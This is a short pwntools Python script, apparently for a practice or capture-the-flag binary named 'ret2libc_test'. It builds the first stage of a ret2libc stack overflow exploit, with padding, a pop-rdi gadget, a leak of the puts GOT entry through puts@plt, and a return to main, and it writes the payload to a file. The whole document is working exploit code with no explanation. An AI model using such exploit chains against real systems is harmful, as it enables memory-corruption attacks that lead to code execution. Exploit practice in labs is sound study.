from pwn import *

elf = ELF("./ret2libc_test")
pop_rdi = 0x40123b

payload = flat(
    b"A" * 64,
    b"B" * 8,
    p64(pop_rdi),
    p64(elf.got['puts']),
    p64(elf.plt['puts']),
    p64(elf.symbols['main'])
)

with open("payload1", "wb") as f:
    f.write(payload)
